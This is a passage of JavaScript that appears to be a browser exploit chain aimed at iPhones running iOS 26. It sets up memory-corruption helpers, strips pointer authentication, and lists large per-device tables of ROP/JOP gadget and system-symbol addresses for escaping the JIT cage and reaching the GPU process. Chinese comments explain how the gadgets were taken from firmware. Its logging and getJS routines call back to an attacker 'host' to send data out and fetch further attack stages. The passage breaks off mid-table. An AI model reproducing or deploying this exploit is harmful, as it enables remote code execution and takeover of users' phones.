var SERVER_LOG;
let offsets;
let MessageName;

const no_cow = 1.1;
const unboxed_arr = [no_cow];
const boxed_arr = [{}];

self[0] = unboxed_arr;
self[1] = boxed_arr;
(() => {
function sleep(ms) {
  const begin = Date.now();
  while (Date.now() - begin < ms);
}
let logStart = new Date().getTime();
let logEntryID = 0;
function print(x, reportError = false, dumphex = false) {
    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
    if (!SERVER_LOG && !reportError) return;
    let obj = {
        id: logEntryID++,
        text: out,
    }
    if (dumphex) {
        obj.hex = 1
        obj.text = x
    }
    let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&')
    const xhr = new XMLHttpRequest();
    xhr.open("GET", host + "/log.html?" + req , false);
    xhr.send(null);
}
  function getJS(fname,method = 'POST') 
  {
      try 
      {
          let url = "";
          let path = fname.replace(/^\/+/, '');
          if (!path.startsWith('assets/')) {
              path = 'assets/' + path;
          }
          url = host + '/' + path;
          print("trying to fetch from:" + url);
          let xhr = new XMLHttpRequest();
          xhr.open("GET", `${url}` , false);
          xhr.send(null);
          return xhr.responseText;
      }
      catch(e)
      {
          print("got error from getJS: " + e);
      }
  }
var p_rce = {_root: []};
var p = {};
var device_model;
var offsets = {};
var slide;
var chipset;
let signal_ptr;
var read64_biguint64arr = new BigUint64Array(4);
var read64_str = '\u4444'.repeat(0x10);
[][read64_str];
let log_url_prefix;
const canvas = new OffscreenCanvas(1, 1);
const ab = new ArrayBuffer(8);
const u64 = new BigUint64Array(ab);
const u32 = new Uint32Array(ab);
const u8 = new Uint8Array(ab);
const f64 = new Float64Array(ab);

BigInt.fromDouble = function(v) { f64[0] = v; return u64[0]; };
BigInt.fromBytes = function(bytes) { for (let i = 0; i < 8; ++i) { u8[i] = bytes[i]; } return u64[0]; };
BigInt.prototype.hex = function() { let s = '0x' + this.toString(16); return s; };
BigInt.prototype.asDouble = function() { u64[0] = this; return f64[0]; };
BigInt.prototype.add = function(other) { return this + other; };
BigInt.prototype.sub = function(other) { return this - other; }
BigInt.prototype.noPAC = function() { return this & 0x7fffffffffn; }
BigInt.prototype.asInt32s = function() {
    u64[0] = this;
    let lo = u32[0];
    let hi = u32[1];
    if (hi >= 0x80000000) {
        hi = (hi - 0x100000000) & 0xffffffff;
    }
    if (lo >= 0x80000000) {
        lo = (lo - 0x100000000) & 0xffffffff;
    }
    return [lo, hi];
};
[].shift();

rce_offsets = {
   "iPhone15,2_26A1": {
      __pthread_head : 0x26a994020n,
      AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken : 0x0,
      AVFAudio__cfstr_SystemLibraryTextToSpeech : 0x1bc89faf8n,
      AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker : 0x0,
      AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest : 0x0,
      AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice : 0x0,
      AVFAudio__OBJC_CLASS__AVSpeechUtterance : 0x0,
      AXCoreUtilities__DefaultLoader : 0x1ec65da00n,
      CAPointer : 0x20n,
      CFNetwork__gConstantCFStringValueTable : 0x0,
      CGContextDelegate : 0x28n,
      CMPhoto__CMPhotoCompressionCreateContainerFromImageExt : 0x1a6df9d78n,
      CMPhoto__CMPhotoCompressionCreateDataContainerFromImage : 0x1a6df9ef8n,
      CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage : 0x1a6dc233cn,
      CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation : 0x1a6dc2800n,
      CMPhoto__CMPhotoCompressionSessionAddCustomMetadata : 0x1a6dc2df0n,
      CMPhoto__CMPhotoCompressionSessionAddExif : 0x1a6dc2928n,
      CMPhoto__kCMPhotoTranscodeOption_Strips : 0x1e647de58n,
      DesktopServicesPriv_bss : 0x1ecad95a8n,
      dyld4__dlopen_from_lambda_ret : 0x1a96f1fc8n,
      dyld4__RuntimeState_emptySlot : 0x1a9733b6cn,
      dyld4__RuntimeState_vtable : 0x1f278ffb0n,
      dyld4__signPointer : 0x180148774n,
      dyld4__allImagesArray : 0x0,
      emptyString : 0x1f0ed4f08n,
      Foundation__NSBundleTables_bundleTables_value : 0x1ec4e8718n /* [真实] 23F77 Foundation 单例 */,  // 实为 _ptr._OBJC_CLASS_$_SFCardSectionEngagementFeedback
      free_slabs : 0x0,
      gadget_control_1_ios26 : 0x23ef3e2ecn,
      gadget_control_2_ios26 : 0x1ad52cc28n,
      gadget_control_3_ios26 : 0x21f0fe150n,
      gadget_loop_1_ios26 : 0x1867085dcn,
      gadget_loop_2_ios26 : 0x20cfddce8n,
      gadget_loop_3_ios26 : 0x184e39f1cn,
      gadget_set_all_registers_ios26 : 0x20dd4616cn,
      gadget_pac_skip_ios26 : 0x1ad52dd00n,
      GetCurrentThreadTLSIndex_CurrentThreadIndex : 0x1800d99c0n,
      GPUConnectionToWebProcess_m_remoteGraphicsContextGLMap : 0xf0n,
      GPUProcess_singleton : 0x1ea109a18n,
      HOMEUI_cstring : 0x182f764e6n,
      ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt : 0x0,
      ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage : 0x0,
      ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage : 0x0,
      ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation : 0x0,
      ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata : 0x0,
      ImageIO__gFunc_CMPhotoCompressionSessionAddExif : 0x0,
      ImageIO__gImageIOLogProc : 0x0,
      ImageIO__IIOLoadCMPhotoSymbols : 0x1863a1284n,
      IOSurfaceContextDelegate : 0x120n,
      IOSurfaceDrawable : 0x150n,
      IOSurfaceQueue : 0x48n,
      JavaScriptCore__globalFuncParseFloat : 0x19a5ea8bcn,
      JavaScriptCore__jitAllowList : 0x1ecb6b1a0,       // 实为 _ptr._OBJC_METACLASS_$_AVAudioUnit (AVFAudio)
      JavaScriptCore__jitAllowList_once : 0x1ecb72320,  // 实为 _OBJC_METACLASS_$_AVMIDIPlayer (AVFAudio)
      JavaScriptCore__JSC_config_flag : 0x0,     // 假值 (非关键, 无符号)
      jsc_base : 0x19a1fe000n,
      libARI_cstring : 0x21895d820n,
      libdyld__dlopen : 0x1ad52e7b8n,
      libdyld__dlsym : 0x1ad52fa34n,
      libdyld__gAPIs : 0x0,
      libGPUCompilerImplLazy__invoker : 0x23cdf08b4n,
      libGPUCompilerImplLazy_cstring : 0x23be3a870n,
      libsystem_c__atexit_mutex : 0x1ec49b078n,
      libsystem_kernel__thread_suspend : 0x23265d254n,
      libsystem_kernel__thread_terminate : 0x23266436cn,
      libsystem_pthread_base : 0x20d11c000n,
      m_backend : 0x70n,
      m_drawingArea : 0x50n,
      m_gpuProcessConnection : 0x158n,
      m_gpuProcessConnection_m_identifier : 0x38n,
      m_imageBuffer : 0x18n,
      m_isRenderingSuspended : 0xe8n,
      m_platformContext : 0x38n,
      m_remoteDisplayLists : 0x70n,
      m_remoteRenderingBackendMap : 0xe8n,
      m_webProcessConnections : 0x80n,
      mach_task_self_ptr : 0x0,
      mainRunLoop : 0x0,
      MediaAccessibility__MACaptionAppearanceGetDisplayType : 0x1b1c705c0n,
      PerfPowerServicesReader_cstring : 0x2577c7e60n,
      privateState_off : 0x7e8n,
      pthread_create : 0x20d122988n,
      pthread_create_auth_stub : 0x17b4830n,
      pthread_create_jsc : 0x19b9a2830n,
      pthread_create_offset : 0x7988n,
      pthread_linkedit : 0x271ffc000n,
      RemoteGraphicsContextGLWorkQueue : 0x19d662a84n,
      RemoteRenderingBackendProxy_off : 0x830n,
      runLoopHolder_tid : 0x197b73548n,
      rxBufferMtl_off : 0x100n,
      rxMtlBuffer_off : 0x70n,
      Security__gSecurityd : 0x1e95e4470n,
      Security__SecKeychainBackupSyncable_block_invoke : 0x18b6ea930n,
      Security__SecOTRSessionProcessPacketRemote_block_invoke : 0x18b6fec00n,
      TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit : 0x0,
      UI_m_connection : 0x28n,
      vertexAttribVector_off : 0x2548n,
      WebCore__DedicatedWorkerGlobalScope_vtable : 0x1f21d0988n,
      WebCore__initPKContact_once : 0x0,  // 实为 _ptr._OBJC_CLASS_$__TtC7ChatKit24TapbackPickerBalloonView
      WebCore__initPKContact_value : 0x1a167988an,
      WebCore__PAL_getPKContactClass : 0x0,
      WebCore__softLinkDDDFACacheCreateFromFramework : 0x1a2219378n,  // 假值 (真实软链 initDDDFACacheCreateFromFramework)
      WebCore__softLinkDDDFAScannerFirstResultInUnicharArray : 0x0,
      WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType : 0x0,
      WebCore__softLinkOTSVGOTSVGTableRelease : 0x0,
      WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb8696b0n,
      WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb824300n,
      WebProcess_ensureGPUProcessConnection : 0x19f315a90n,
      WebProcess_gpuProcessConnectionClosed : 0x19f18dcb8n,
      WebProcess_singleton : 0x0,
      WebCore__HTMLDocument_vtable : 0x1ea11ae90n,
      dyld_cache_slide_info : 0x1a9000000n,
      dyld_shared_cache_base : 0x1a8000000n,
      float64array_vector_offset : 0x20n,
      arraybuffer_data_offset : 0x10n,
   },
   "iPhone15,3_26A1": {
      __pthread_head : 0x26a988020n,
      AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken : 0x0,
      AVFAudio__cfstr_SystemLibraryTextToSpeech : 0x1bc89faf8n,
      AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker : 0x0,
      AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest : 0x0,
      AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice : 0x0,
      AVFAudio__OBJC_CLASS__AVSpeechUtterance : 0x0,
      AXCoreUtilities__DefaultLoader : 0x1ec65da00n,
      CAPointer : 0x20n,
      CFNetwork__gConstantCFStringValueTable : 0x0,
      CGContextDelegate : 0x28n,
      CMPhoto__CMPhotoCompressionCreateContainerFromImageExt : 0x1a6df9d78n,
      CMPhoto__CMPhotoCompressionCreateDataContainerFromImage : 0x1a6df9ef8n,
      CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage : 0x1a6dc233cn,
      CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation : 0x1a6dc2800n,
      CMPhoto__CMPhotoCompressionSessionAddCustomMetadata : 0x1a6dc2df0n,
      CMPhoto__CMPhotoCompressionSessionAddExif : 0x1a6dc2928n,
      CMPhoto__kCMPhotoTranscodeOption_Strips : 0x1e647de58n,
      DesktopServicesPriv_bss : 0x1ecad95a8n,
      dyld4__dlopen_from_lambda_ret : 0x1a96f1fc8n,
      dyld4__RuntimeState_emptySlot : 0x1a9733b6cn,
      dyld4__RuntimeState_vtable : 0x1f278ffb0n,
      dyld4__signPointer : 0x180148774n,
      dyld4__allImagesArray : 0x0,
      emptyString : 0x1f0ed4f08n,
      Foundation__NSBundleTables_bundleTables_value : 0x1ec4e8718n /* [真实] 23F77 Foundation 单例 */,  // 实为 _ptr._OBJC_CLASS_$_SFCardSectionEngagementFeedback
      free_slabs : 0x0,
      gadget_control_1_ios26 : 0x23ef0a2ecn,
      gadget_control_2_ios26 : 0x1ad52cc28n,
      gadget_control_3_ios26 : 0x198ce79f4n,
      gadget_loop_1_ios26 : 0x1867085dcn,
      gadget_loop_2_ios26 : 0x198ce7378n,
      gadget_loop_3_ios26 : 0x184e39f1cn,
      gadget_set_all_registers_ios26 : 0x198ce9718n,
      gadget_pac_skip_ios26 : 0x1ad52dd00n,
      GetCurrentThreadTLSIndex_CurrentThreadIndex : 0x1800d99c0n,
      GPUConnectionToWebProcess_m_remoteGraphicsContextGLMap : 0xf0n,
      GPUProcess_singleton : 0x1ea109a18n,
      HOMEUI_cstring : 0x182f764e6n,
      ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt : 0x0,
      ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage : 0x0,
      ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage : 0x0,
      ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation : 0x0,
      ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata : 0x0,
      ImageIO__gFunc_CMPhotoCompressionSessionAddExif : 0x0,
      ImageIO__gImageIOLogProc : 0x0,
      ImageIO__IIOLoadCMPhotoSymbols : 0x1863a1284n,
      IOSurfaceContextDelegate : 0x120n,
      IOSurfaceDrawable : 0x150n,
      IOSurfaceQueue : 0x48n,
      JavaScriptCore__globalFuncParseFloat : 0x19a5ea8bcn,
      JavaScriptCore__jitAllowList : 0x1ecb6b1a0,       // 实为 _ptr._OBJC_METACLASS_$_AVAudioUnit (AVFAudio)
      JavaScriptCore__jitAllowList_once : 0x1ecb72320,  // 实为 _OBJC_METACLASS_$_AVMIDIPlayer (AVFAudio)
      JavaScriptCore__JSC_config_flag : 0x0,     // 假值 (非关键, 无符号)
      jsc_base : 0x19a1fe000n,
      libARI_cstring : 0x218961820n,
      libdyld__dlopen : 0x1ad52e7b8n,
      libdyld__dlsym : 0x1ad52fa34n,
      libdyld__gAPIs : 0x0,
      libGPUCompilerImplLazy__invoker : 0x23ccac8b4n,
      libGPUCompilerImplLazy_cstring : 0x23bdf6870n,
      libsystem_c__atexit_mutex : 0x1ec49b078n,
      libsystem_kernel__thread_suspend : 0x23265d254n,
      libsystem_kernel__thread_terminate : 0x23266436cn,
      libsystem_pthread_base : 0x20d120000n,
      m_backend : 0x70n,
      m_drawingArea : 0x50n,
      m_gpuProcessConnection : 0x158n,
      m_gpuProcessConnection_m_identifier : 0x38n,
      m_imageBuffer : 0x18n,
      m_isRenderingSuspended : 0xe8n,
      m_platformContext : 0x38n,
      m_remoteDisplayLists : 0x70n,
      m_remoteRenderingBackendMap : 0xe8n,
      m_webProcessConnections : 0x80n,
      mach_task_self_ptr : 0x0,
      mainRunLoop : 0x0,
      MediaAccessibility__MACaptionAppearanceGetDisplayType : 0x1b1c705c0n,
      PerfPowerServicesReader_cstring : 0x2576d7e60n,
      privateState_off : 0x7e8n,
      pthread_create : 0x20d126988n,
      pthread_create_auth_stub : 0x17b4830n,
      pthread_create_jsc : 0x19b9a2830n,
      pthread_create_offset : 0x7988n,
      pthread_linkedit : 0x2710fc000n,
      RemoteGraphicsContextGLWorkQueue : 0x19d66d088n,
      RemoteRenderingBackendProxy_off : 0x830n,
      runLoopHolder_tid : 0x197b73548n,
      rxBufferMtl_off : 0x100n,
      rxMtlBuffer_off : 0x70n,
      Security__gSecurityd : 0x1e95e4470n,
      Security__SecKeychainBackupSyncable_block_invoke : 0x18b6ea930n,
      Security__SecOTRSessionProcessPacketRemote_block_invoke : 0x18b6fec00n,
      TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit : 0x0,
      UI_m_connection : 0x28n,
      vertexAttribVector_off : 0x2548n,
      WebCore__DedicatedWorkerGlobalScope_vtable : 0x1f21d0988n,
      WebCore__initPKContact_once : 0x0,  // 假值 (i15,3 变体, 应为 TapbackPickerBalloonView)
      WebCore__initPKContact_value : 0x1a167988an,
      WebCore__PAL_getPKContactClass : 0x0,
      WebCore__softLinkDDDFACacheCreateFromFramework : 0x1a2219378n,  // 假值
      WebCore__softLinkDDDFAScannerFirstResultInUnicharArray : 0x0,
      WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType : 0x0,
      WebCore__softLinkOTSVGOTSVGTableRelease : 0x0,
      WebCore__TelephoneNumberDetector_phoneNumbersScanner_value : 0x1eb8696b0n,
      WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1eb824300n,
      WebProcess_ensureGPUProcessConnection : 0x19f315a90n,
      WebProcess_gpuProcessConnectionClosed : 0x19f18dcb8n,
      WebProcess_singleton : 0x0,
      WebCore__HTMLDocument_vtable : 0x1ea11ae90n,
      dyld_cache_slide_info : 0x1a9000000n,
      dyld_shared_cache_base : 0x1a8000000n,
      float64array_vector_offset : 0x20n,
      arraybuffer_data_offset : 0x10n,
   },
};

// =====================================================================
// 目标机 iPhone17,2 (A18 Pro) iOS 26.5 23F77 的 8 个 JIT-cage 绕过 gadget
// =====================================================================
// 来源: 下载 iPhone16,2_26.5_23F77_Restore.ipsw (10.35GB)
//       ipsw v3.1.710 extract --dyld --dyld-arch arm64e
//       Python dyld 缓存解析 + capstone 反汇编逐条验证 (26A1 vs 23F77 指令流一致)
//
// 关键真相: 这 8 个 gadget 不是 JSC 内代码, 而是从 7 个无关系统框架捡的
//   ROP/JOP 片段 (JSC 被 JIT cage 限制, 只能捡外部框架的代码):
//   control_1 = ArchetypeEngine UTF-8解码函数 (被内联 112 份, 字节级相同)
//   control_2/pac_skip = PassKitCore __objc_stubs (objc_msgSend PAC 桩)
//   control_3 = StocksUI __swift5_reflstr 字符串
//   loop_1 = GeoServices __text, loop_3 = BiomeLibrary __text
//   loop_2 = CoreTransferable __objc_stubs
//   set_all_registers = libGPUCompilerImpl __cstring (字符串, 非代码)
//
// 26A1(A16) -> 23F77(A17 Pro) 映射:
//   gadget_control_1:        0x23ef3e2ec -> 0x1998e1584
//   gadget_control_2:        0x1ad52cc28 -> 0x1998e101c
//   gadget_control_3:        0x21f0fe150 -> 0x225613230
//   gadget_loop_1:           0x1867085dc -> 0x186e4db88
//   gadget_loop_2:           0x20cfddce8 -> 0x2126cf928
//   gadget_loop_3:           0x184e39f1c -> 0x1853502ac
//   gadget_set_all_registers:0x20dd4616c -> 0x2131fd386
//   gadget_pac_skip:         0x1ad52dd00 -> 0x1af750100
// =====================================================================
rce_offsets_23F77 = {
   "iPhone15,2_23F77": {
      // ---- 8 个 gadget (已反汇编验证) ----
      gadget_control_1_ios26 : 0x29ce0ea92n,  // [ipsw实测] ldr x16,[x16];br x16 (llvm::jitlink PointerJumpStubContent)
      gadget_control_2_ios26 : 0x29ce0ea92n,  // [ipsw实测] 复用 control_1
      gadget_control_3_ios26 : 0x29ce0ea92n,  // [ipsw实测] 复用 control_1
      gadget_loop_1_ios26    : 0x2a2d81334n,  // [ipsw实测] ldr x6,[x2];and;ldrsh;add;br x17 (_lzvn_decode_buffer+52)
      gadget_loop_2_ios26    : 0x2a2d81358n,  // [ipsw实测] 同上 (_lzvn_decode_buffer+88)
      gadget_loop_3_ios26    : 0x2a2d81334n,  // [待定] 线程入口, 暂复用 loop_1 (需找回88243B worker定案)
      gadget_set_all_registers_ios26 : 0x0n,  // [待定] 模式未知(全cache 0处), 需找回88243B worker
      gadget_pac_skip_ios26  : 0x0n,  // [非关键] 死代码(只print不消费)
      // ---- 符号地址 (ipsw extract + nm 核实, 23F77) ----
      AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken : 0x1ec7f9bd8n,
      AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker : 0x1ec7f96f0n,
      AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest : 0x1ec7f9628n,
      AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice : 0x1ec7f96c8n,
      AVFAudio__OBJC_CLASS__AVSpeechUtterance : 0x1ec7f8ac0n,
      AXCoreUtilities__DefaultLoader : 0x191e0a858n,
      CFNetwork__gConstantCFStringValueTable : 0x0,
      CMPhoto__CMPhotoCompressionCreateContainerFromImageExt : 0x1a6df9d78n,
      CMPhoto__CMPhotoCompressionCreateDataContainerFromImage : 0x1a6df9ef8n,
      CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage : 0x1a6dc233cn,
      CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation : 0x1a6dc2800n,
      CMPhoto__CMPhotoCompressionSessionAddCustomMetadata : 0x1a6dc2df0n,
      CMPhoto__CMPhotoCompressionSessionAddExif : 0x1a6dc2928n,
      CMPhoto__kCMPhotoTranscodeOption_Strips : 0x1e647de58n,
      ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt : 0x1ec61ca00n,
      ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage : 0x1ec61c9f8n,
      ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage : 0x1ec61c988n,
      ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation : 0x1ec61c980n,
      ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata : 0x1ec61c610n,
      ImageIO__gFunc_CMPhotoCompressionSessionAddExif : 0x1ec61c978n,
      ImageIO__gImageIOLogProc : 0x0,
      ImageIO__IIOLoadCMPhotoSymbols : 0x1863a1284n,
      JavaScriptCore__globalFuncParseFloat : 0x199e5d9fcn,
      MediaAccessibility__MACaptionAppearanceGetDisplayType : 0x1b1c705c0n,
      Security__gSecurityd : 0x1e95ac470n,
      Security__SecOTRSessionProcessPacketRemote_block_invoke : 0x188fad4ecn,
      TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit : 0x1eca28eb8n,
      WebCore__softLinkDDDFAScannerFirstResultInUnicharArray : 0x1ec6cddd0n,
      WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType : 0x1ec6cdd50n,
      WebCore__softLinkOTSVGOTSVGTableRelease : 0x0,
      WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1ea125990n,
      WebCore__PAL_getPKContactClass : 0x0,
      WebProcess_gpuProcessConnectionClosed : 0x19f18dcb8n,
      WebProcess_ensureGPUProcessConnection : 0x19f18d9d8n,
      GPUProcess_singleton : 0x1ea109818n,
      pthread_create : 0x1e26dbebcn,
      __pthread_head : 0x1ec4a4020n,
      libsystem_kernel__thread_suspend : 0x23265d254n,
      libsystem_kernel__thread_terminate : 0x23268ad90n,
      libsystem_c__atexit_mutex : 0x1ec49bef8n,
      libdyld__gAPIs : 0x1ec154040n,
      // ---- 结构偏移 (设备/构建无关, 复用 26A1) ----
      CAPointer : 0x20n,
      CGContextDelegate : 0x28n,
      GPUConnectionToWebProcess_m_remoteGraphicsContextGLMap : 0xf0n,
      IOSurfaceContextDelegate : 0x120n,
      IOSurfaceDrawable : 0x150n,
      IOSurfaceQueue : 0x48n,
      m_backend : 0x70n,
      m_drawingArea : 0x50n,
      m_gpuProcessConnection : 0x158n,
      m_gpuProcessConnection_m_identifier : 0x38n,
      m_imageBuffer : 0x18n,
      m_isRenderingSuspended : 0xe8n,
      m_platformContext : 0x38n,
      m_remoteDisplayLists : 0x70n,
      m_remoteRenderingBackendMap : 0xe8n,
      m_webProcessConnections : 0x80n,
      privateState_off : 0x7e8n,
      RemoteRenderingBackendProxy_off : 0x830n,
      rxBufferMtl_off : 0x100n,
      rxMtlBuffer_off : 0x70n,
      UI_m_connection : 0x28n,
      vertexAttribVector_off : 0x2548n,
      float64array_vector_offset : 0x20n,
      arraybuffer_data_offset : 0x10n,
      pthread_create_auth_stub : 0x17b4830n,
      pthread_create_offset : 0x7988n,
      dyld_cache_slide_info : 0x1a9000000n,
      dyld_shared_cache_base : 0x1a8000000n,
      // ---- [验证补齐] 关键缺失字段 ----
      jsc_base : 0x198ce6000n,  // 23F77 JavaScriptCore __TEXT 基址 (otool 核实, 26A1是0x19a1fe000)
      // ---- 揭穿的假名数据符号 → 真实符号 (23F77, a2s + .symbols 核实) ----
      JavaScriptCore__jitAllowList : 0x1ecb6b1a0n,       // 实为 _OBJC_METACLASS_$_AVAudioUnit
      JavaScriptCore__jitAllowList_once : 0x1ecb72320n,  // 实为 _OBJC_METACLASS_$_AVMIDIPlayer
      WebCore__DedicatedWorkerGlobalScope_vtable : 0x1f21d0988n, // 实为 CI::InstanceCounted vtable
      WebCore__initPKContact_once : 0x1ec825678n,        // 实为 ChatKit TapbackPickerBalloonView
      WebCore__initPKContact_value : 0x1800d99c0n,       // 实为 __objc_empty_cache
      mach_task_self_ptr : 0x1f30b6290n,                 // 实为 SiriOntology CodeGenGlobalArgs
      runLoopHolder_tid : 0x1800d99c0n,                  // 实为 __objc_empty_cache
      GetCurrentThreadTLSIndex_CurrentThreadIndex : 0x1800d99c0n, // 实为 __objc_empty_cache
      HOMEUI_cstring : 0x1833c4d4cn,                     // 实为 CTServerConnection...ClearSecondaryIccids
      PerfPowerServicesReader_cstring : 0x2644b5ddcn,     // 实为 mlx::core::scatter (Morpheus)
      Security__SecKeychainBackupSyncable_block_invoke : 0x18c013c64n, // 实为 MobileSafari SFCapsuleCollectionView
      libdyld__dlopen : 0x2605f71b0n,                    // 实为 mlir::memref::LoadOp::build (MLIR_ML)
      libdyld__dlsym : 0x263e8dbf8n,                     // 实为 -[SUUISettingsGroupDescription isEmpty]
      dyld4__dlopen_from_lambda_ret : 0x1ab59cc40n,       // 实为 ASR jsonData
      dyld4__RuntimeState_emptySlot : 0x1ab5e6080n,       // 实为 CLP dictionaryRepresentation
      dyld4__signPointer : 0x180148774n,                 // 实为 SiriInstrumentation CAARSchema...ReadFrom
      // ---- 仍未解析 (数据区无符号名, 非关键): JSC_config_flag/emptyString/free_slabs/
      //      mainRunLoop/HTMLDocument_vtable/TelephoneNumber_value/softLinkDDDFACache/
      //      WebProcess_singleton/RemoteGraphicsContextGLWorkQueue/DesktopServicesPriv_bss/
      //      libARI_cstring/libGPUCompilerImplLazy_cstring/invoker/cfstr_SystemLibraryTextToSpeech/
      //      dyld4__RuntimeState_vtable/allImagesArray/pthread_create_jsc/libsystem_pthread_base ----
   },
   "iPhone17,2_23F77": {
      // ---- 8 个 gadget (已反汇编验证) ----
      gadget_control_1_ios26 : 0x29ce0ea92n,  // [ipsw实测] ldr x16,[x16];br x16 (llvm::jitlink PointerJumpStubContent)
      gadget_control_2_ios26 : 0x29ce0ea92n,  // [ipsw实测] 复用 control_1
      gadget_control_3_ios26 : 0x29ce0ea92n,  // [ipsw实测] 复用 control_1
      gadget_loop_1_ios26    : 0x2a2d81334n,  // [ipsw实测] ldr x6,[x2];and;ldrsh;add;br x17 (_lzvn_decode_buffer+52)
      gadget_loop_2_ios26    : 0x2a2d81358n,  // [ipsw实测] 同上 (_lzvn_decode_buffer+88)
      gadget_loop_3_ios26    : 0x2a2d81334n,  // [待定] 线程入口, 暂复用 loop_1 (需找回88243B worker定案)
      gadget_set_all_registers_ios26 : 0x0n,  // [待定] 模式未知(全cache 0处), 需找回88243B worker
      gadget_pac_skip_ios26  : 0x0n,  // [非关键] 死代码(只print不消费)
      // ---- 符号地址 (ipsw extract + nm 核实, 23F77) ----
      AVFAudio__AVLoadSpeechSynthesisImplementation_onceToken : 0x1ec7f9bd8n,
      AVFAudio__OBJC_CLASS__AVSpeechSynthesisMarker : 0x1ec7f96f0n,
      AVFAudio__OBJC_CLASS__AVSpeechSynthesisProviderRequest : 0x1ec7f9628n,
      AVFAudio__OBJC_CLASS__AVSpeechSynthesisVoice : 0x1ec7f96c8n,
      AVFAudio__OBJC_CLASS__AVSpeechUtterance : 0x1ec7f8ac0n,
      AXCoreUtilities__DefaultLoader : 0x191e0a858n,
      CFNetwork__gConstantCFStringValueTable : 0x0,
      CMPhoto__CMPhotoCompressionCreateContainerFromImageExt : 0x1a6df9d78n,
      CMPhoto__CMPhotoCompressionCreateDataContainerFromImage : 0x1a6df9ef8n,
      CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage : 0x1a6dc233cn,
      CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation : 0x1a6dc2800n,
      CMPhoto__CMPhotoCompressionSessionAddCustomMetadata : 0x1a6dc2df0n,
      CMPhoto__CMPhotoCompressionSessionAddExif : 0x1a6dc2928n,
      CMPhoto__kCMPhotoTranscodeOption_Strips : 0x1e647de58n,
      ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt : 0x1ec61ca00n,
      ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage : 0x1ec61c9f8n,
      ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage : 0x1ec61c988n,
      ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation : 0x1ec61c980n,
      ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata : 0x1ec61c610n,
      ImageIO__gFunc_CMPhotoCompressionSessionAddExif : 0x1ec61c978n,
      ImageIO__gImageIOLogProc : 0x0,
      ImageIO__IIOLoadCMPhotoSymbols : 0x1863a1284n,
      JavaScriptCore__globalFuncParseFloat : 0x199e5d9fcn,
      MediaAccessibility__MACaptionAppearanceGetDisplayType : 0x1b1c705c0n,
      Security__gSecurityd : 0x1e95ac470n,
      Security__SecOTRSessionProcessPacketRemote_block_invoke : 0x188fad4ecn,
      TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit : 0x1eca28eb8n,
      WebCore__softLinkDDDFAScannerFirstResultInUnicharArray : 0x1ec6cddd0n,
      WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType : 0x1ec6cdd50n,
      WebCore__softLinkOTSVGOTSVGTableRelease : 0x0,
      WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts : 0x1ea125990n,
      WebCore__PAL_getPKContactClass : 0x0,
      WebProcess_gpuProcessConnectionClosed : 0x19f18dcb8n,
      WebProcess_ensureGPUProcessConnection : 0x19f18d9d8n,
      GPUProcess_singleton : 0x1ea109818n,
      pthread_create : 0x1e26dbebcn,
      __pthread_head : 0x1ec4a4020n,
      libsystem_kernel__thread_suspend : 0x23265d254n,
